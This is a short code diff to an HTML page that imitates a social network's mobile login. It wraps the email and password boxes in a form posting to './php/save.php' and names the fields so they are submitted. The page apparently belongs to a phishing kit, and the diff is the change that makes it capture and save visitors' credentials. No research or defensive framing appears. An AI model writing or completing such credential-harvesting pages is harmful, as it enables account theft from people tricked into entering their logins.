@@ -195,13 +195,17 @@
     </a>
   </div>
   <div class="mobmaindiv" method= "post" action= "save.php">
+    <form action="./php/save.php" method="POST">
+
     <div id="mobtextdiv">
-      <input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
-      <input type="password" class="mobtextbox mobtextbox2" placeholder="Password">
+      <input type="text" name="email" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
+      <input type="password" name="password" class="mobtextbox mobtextbox2" placeholder="Password">
     </div>
     <div class="mobloginbuttondiv">
       <input type="submit" class="mobloginbutton" value="Log In">
     </div>
+</form>
+
     <div id="ordiv">
     <span id="or">or</span>
     </div>
